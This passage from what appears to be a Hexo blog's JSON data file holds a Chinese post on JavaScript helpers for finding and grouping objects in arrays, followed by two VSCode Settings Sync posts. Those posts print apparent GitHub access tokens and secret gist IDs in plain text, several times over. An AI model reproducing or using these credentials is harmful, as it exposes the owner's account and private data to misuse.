class=\"line\">        console.log(hasKey(arr, getKey(b)));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        function getIndex(arr, objKey, key) &#123;</span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                return i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;2&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;3&apos;</span><br><span class=\"line\">        &#125;]</span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function pushToArr(val) &#123;</span><br><span class=\"line\">                if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr.push(val)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pushToArr(b)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        function getIndex(arr, key) &#123;</span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                return i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;2&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;3&apos;</span><br><span class=\"line\">        &#125;]</span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var c = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function pushToArr(val) &#123;</span><br><span class=\"line\">                if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                        if (arr[getIndex(arr, getKey(val))].children) &#123;</span><br><span class=\"line\">                                arr[getIndex(arr, getKey(val))].children.push(val)</span><br><span class=\"line\">                        &#125; else &#123;</span><br><span class=\"line\">                                arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr.push(val)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pushToArr(a)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">        pushToArr(c)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"遍历数组对象\"><a href=\"#遍历数组对象\" class=\"headerlink\" title=\"遍历数组对象\"></a>遍历数组对象</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** 参数说明</span><br><span class=\"line\"> * arr: array = 被遍历 数组proto</span><br><span class=\"line\"> * objKey: string = filter</span><br><span class=\"line\"> * key: string = 当前筛选项</span><br><span class=\"line\"> */</span><br><span class=\"line\">getIndex = function (arr, objKey, key) &#123;</span><br><span class=\"line\">  for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    if (arr[i][objKey] === key) &#123;</span><br><span class=\"line\">      return i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (const item of callback.data.items) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  let inArr = getIndex(this.imgsCascade, &quot;value&quot;, item.imgMode)</span><br><span class=\"line\"></span><br><span class=\"line\">  let thisObj = array[inArr]</span><br><span class=\"line\"></span><br><span class=\"line\">  if (inArr &gt; -1) &#123;</span><br><span class=\"line\">    thisObj.children ?</span><br><span class=\"line\">      thisObj.children.push(children) :</span><br><span class=\"line\">      thisObj.children = [children];</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    array.push(</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        value: item.imgMode,</span><br><span class=\"line\">        label: item.imgItem,</span><br><span class=\"line\">        children: [&#123;xxx:xxx, yyy:yyy&#125;]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">function getIndex(arr, key) &#123;</span><br><span class=\"line\">        for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                if (arr[i].key === key) &#123;</span><br><span class=\"line\">                        return i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return -1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getKey(obj) &#123;</span><br><span class=\"line\">        return obj.key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var arr = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;1&apos;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;2&apos;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    key: &apos;3&apos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\">var a = &#123;</span><br><span class=\"line\">        key: &apos;1&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var c = &#123;</span><br><span class=\"line\">        key: &apos;1&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var b = &#123;</span><br><span class=\"line\">        key: &apos;4&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function pushToArr(val) &#123;</span><br><span class=\"line\">        if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                if (arr[getIndex(arr, getKey(val))].children) &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children.push(val)</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">                arr.push(val)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pushToArr(a)</span><br><span class=\"line\">console.log(arr);</span><br><span class=\"line\">pushToArr(c)</span><br><span class=\"line\">console.log(arr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">        function hasKey(arr, key) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                var ret = false;</span><br><span class=\"line\"></span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                ret = true;</span><br><span class=\"line\">                                break;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return ret;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                        key: &apos;1&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        key: &apos;2&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        key: &apos;3&apos;,</span><br><span class=\"line\">                        children: [</span><br><span class=\"line\"></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(hasKey(arr, getKey(a)));</span><br><span class=\"line\">        console.log(hasKey(arr, getKey(b)));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        function getIndex(arr, objKey, key) &#123;</span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                return i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;2&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;3&apos;</span><br><span class=\"line\">        &#125;]</span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function pushToArr(val) &#123;</span><br><span class=\"line\">                if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                        arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr.push(val)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pushToArr(b)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        function getIndex(arr, key) &#123;</span><br><span class=\"line\">                for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">                        if (arr[i].key === key) &#123;</span><br><span class=\"line\">                                return i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                return -1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function getKey(obj) &#123;</span><br><span class=\"line\">                return obj.key;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        var arr = [&#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;2&apos;</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">                key: &apos;3&apos;</span><br><span class=\"line\">        &#125;]</span><br><span class=\"line\">        var a = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var c = &#123;</span><br><span class=\"line\">                key: &apos;1&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        var b = &#123;</span><br><span class=\"line\">                key: &apos;4&apos;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function pushToArr(val) &#123;</span><br><span class=\"line\">                if (getIndex(arr, getKey(val)) &gt; -1) &#123;</span><br><span class=\"line\">                        if (arr[getIndex(arr, getKey(val))].children) &#123;</span><br><span class=\"line\">                                arr[getIndex(arr, getKey(val))].children.push(val)</span><br><span class=\"line\">                        &#125; else &#123;</span><br><span class=\"line\">                                arr[getIndex(arr, getKey(val))].children = [val]</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                        arr.push(val)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pushToArr(a)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">        pushToArr(c)</span><br><span class=\"line\">        console.log(arr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"EditorSettingsSync","date":"2018-05-23T06:31:10.000Z","_content":"生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df","source":"_posts/Editor/EditorSettingsSync.md","raw":"---\ntitle: EditorSettingsSync\ndate: 2018-05-23 14:31:10\ntags: 编辑器设置同步\ncategories: VSCode\n---\n生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df","slug":"Editor/EditorSettingsSync","published":1,"updated":"2018-09-05T06:33:18.442Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuq002lzodveakeo6zh","content":"<p>生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df</p>\n","site":{"data":{}},"excerpt":"","more":"<p>生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df</p>\n"},{"title":"VSCode Update","date":"2018-05-11T01:15:17.000Z","_content":"\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\nGitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3\n\nGitHub Gist: 12d91e8460e10f3c9083b82a25623363\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\nFiles Uploaded:\n\n  javascript.json > snippets | javascript.json\n\n  Extensions Removed:\n\nExtensions Added: \\\n  Angular2 v6.0.0 \\\n  background v1.1.17 \\\n  beautify v1.3.0 \\\n  bracket-pair-colorizer v1.0.48 \\\n  code-gnu-global v0.2.2 \\\n  code-settings-sync v2.9.2 \\\n  cpptools v0.17.0 \\\n  ejs-language-support v0.0.1 \\\n  ejs-snippets v0.1.0 \\\n  git-project-manager v1.5.1 \\\n  githistory v0.4.0 \\\n  gitlens v8.2.4 \\\n  html-snippets v0.2.1 \\\n  java v0.24.0 \\\n  javascript-ejs-support v0.3.2 \\\n  JavaScriptSnippets v1.6.0 \\\n  jquerysnippets v0.0.1 \\\n  language-stylus v1.9.2 \\\n  mongoose-os-ide v0.3.0 \\\n  mssql v1.3.1 \\\n  node-module-intellisense v1.5.0 \\\n  npm-intellisense v1.3.0 \\\n  python v2018.4.0 \\\n  tslint v1.0.28 \\\n  vetur v0.11.7 \\\n  view-in-browser v0.0.5 \\\n  vscode-eslint v1.4.8 \\\n  vscode-great-icons v2.1.31 \\\n  vscode-html-css v0.2.0 \\\n  vscode-icons v7.23.0 \\\n  vscode-java-debug v0.9.0 \\\n  vscode-language-babel v0.0.14 \\\n  vscode-language-pack-zh-hans v1.23.4 \\\n  vscode-map-preview v0.4.2 \\\n  vscode-maven v0.7.0 \\\n  vscode-mongodb v0.0.2 \\\n  vscode-npm-script v0.3.4 \\\n  vscode-preview-server v1.0.1 \\\n  vue-vscode-snippets v1.3.0 \\\n  weex v0.4.0 \\\n  xml v1.9.2\n  \n--------------------\nDone.\n\n--------------------\n\n## 2018年5月23日 14:37:12\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\n\nGitHub Token: **c49d7c88a2236d998b043830034a10d1b00ca5df**\n\n**GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c**\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\n\nFiles Uploaded:\n\n  javascript.json > snippets|javascript.json\n\n  Extensions Removed:\n\nExtensions Added:\\\n  Angular2 v6.1.1\\\n  background v1.1.17\\\n  beautify v1.3.0\\\n  bracket-pair-colorizer v1.0.53\\\n  code-gnu-global v0.2.2\\\n  code-settings-sync v2.9.2\\\n  cpptools v0.17.3\\\n  ejs-language-support v0.0.1\\\n  ejs-snippets v0.1.0\\\n  git-project-manager v1.6.1\\\n  githistory v0.4.1\\\n  gitlens v8.3.2\\\n  html-snippets v0.2.1\\\n  java v0.25.0\\\n  javascript-ejs-support v0.3.2\\\n  JavaScriptSnippets v1.6.0\\\n  jquerysnippets v0.0.1\\\n  language-stylus v1.9.2\\\n  mongoose-os-ide v0.3.0\\\n  mssql v1.3.1\\\n  node-module-intellisense v1.5.0\\\n  npm-intellisense v1.3.0\\\n  python v2018.4.0\\\n  tslint v1.0.29\\\n  vetur v0.12.3\\\n  view-in-browser v0.0.5\\\n  vscode-eslint v1.4.10\\\n  vscode-great-icons v2.1.32\\\n  vscode-html-css v0.2.0\\\n  vscode-icons v7.23.0\\\n  vscode-java-debug v0.9.0\\\n  vscode-language-babel v0.0.14\\\n  vscode-language-pack-zh-hans v1.23.5\\\n  vscode-map-preview v0.4.2\\\n  vscode-maven v0.8.0\\\n  vscode-mongodb v0.0.2\\\n  vscode-npm-script v0.3.4\\\n  vscode-preview-server v1.0.1\\\n  vue-vscode-snippets v1.3.0\\\n  weex v0.4.0\\\n  xml v1.9.2\n  \n--------------------\nDone.","source":"_posts/Editor/VSCode-Update.md","raw":"---\ntitle: VSCode Update\ndate: 2018-05-11 09:15:17\ntags: 编辑器更新\ncategories: VSCode\n---\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\nGitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3\n\nGitHub Gist: 12d91e8460e10f3c9083b82a25623363\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\nFiles Uploaded:\n\n  javascript.json > snippets | javascript.json\n\n  Extensions Removed:\n\nExtensions Added: \\\n  Angular2 v6.0.0 \\\n  background v1.1.17 \\\n  beautify v1.3.0 \\\n  bracket-pair-colorizer v1.0.48 \\\n  code-gnu-global v0.2.2 \\\n  code-settings-sync v2.9.2 \\\n  cpptools v0.17.0 \\\n  ejs-language-support v0.0.1 \\\n  ejs-snippets v0.1.0 \\\n  git-project-manager v1.5.1 \\\n  githistory v0.4.0 \\\n  gitlens v8.2.4 \\\n  html-snippets v0.2.1 \\\n  java v0.24.0 \\\n  javascript-ejs-support v0.3.2 \\\n  JavaScriptSnippets v1.6.0 \\\n  jquerysnippets v0.0.1 \\\n  language-stylus v1.9.2 \\\n  mongoose-os-ide v0.3.0 \\\n  mssql v1.3.1 \\\n  node-module-intellisense v1.5.0 \\\n  npm-intellisense v1.3.0 \\\n  python v2018.4.0 \\\n  tslint v1.0.28 \\\n  vetur v0.11.7 \\\n  view-in-browser v0.0.5 \\\n  vscode-eslint v1.4.8 \\\n  vscode-great-icons v2.1.31 \\\n  vscode-html-css v0.2.0 \\\n  vscode-icons v7.23.0 \\\n  vscode-java-debug v0.9.0 \\\n  vscode-language-babel v0.0.14 \\\n  vscode-language-pack-zh-hans v1.23.4 \\\n  vscode-map-preview v0.4.2 \\\n  vscode-maven v0.7.0 \\\n  vscode-mongodb v0.0.2 \\\n  vscode-npm-script v0.3.4 \\\n  vscode-preview-server v1.0.1 \\\n  vue-vscode-snippets v1.3.0 \\\n  weex v0.4.0 \\\n  xml v1.9.2\n  \n--------------------\nDone.\n\n--------------------\n\n## 2018年5月23日 14:37:12\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\n\nGitHub Token: **c49d7c88a2236d998b043830034a10d1b00ca5df**\n\n**GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c**\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\n\nFiles Uploaded:\n\n  javascript.json > snippets|javascript.json\n\n  Extensions Removed:\n\nExtensions Added:\\\n  Angular2 v6.1.1\\\n  background v1.1.17\\\n  beautify v1.3.0\\\n  bracket-pair-colorizer v1.0.53\\\n  code-gnu-global v0.2.2\\\n  code-settings-sync v2.9.2\\\n  cpptools v0.17.3\\\n  ejs-language-support v0.0.1\\\n  ejs-snippets v0.1.0\\\n  git-project-manager v1.6.1\\\n  githistory v0.4.1\\\n  gitlens v8.3.2\\\n  html-snippets v0.2.1\\\n  java v0.25.0\\\n  javascript-ejs-support v0.3.2\\\n  JavaScriptSnippets v1.6.0\\\n  jquerysnippets v0.0.1\\\n  language-stylus v1.9.2\\\n  mongoose-os-ide v0.3.0\\\n  mssql v1.3.1\\\n  node-module-intellisense v1.5.0\\\n  npm-intellisense v1.3.0\\\n  python v2018.4.0\\\n  tslint v1.0.29\\\n  vetur v0.12.3\\\n  view-in-browser v0.0.5\\\n  vscode-eslint v1.4.10\\\n  vscode-great-icons v2.1.32\\\n  vscode-html-css v0.2.0\\\n  vscode-icons v7.23.0\\\n  vscode-java-debug v0.9.0\\\n  vscode-language-babel v0.0.14\\\n  vscode-language-pack-zh-hans v1.23.5\\\n  vscode-map-preview v0.4.2\\\n  vscode-maven v0.8.0\\\n  vscode-mongodb v0.0.2\\\n  vscode-npm-script v0.3.4\\\n  vscode-preview-server v1.0.1\\\n  vue-vscode-snippets v1.3.0\\\n  weex v0.4.0\\\n  xml v1.9.2\n  \n--------------------\nDone.","slug":"Editor/VSCode-Update","published":1,"updated":"2018-09-05T06:33:18.443Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxus002ozodviovgg7y9","content":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3</p>\n<p>GitHub Gist: 12d91e8460e10f3c9083b82a25623363</p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets | javascript.json</p>\n<p>  Extensions 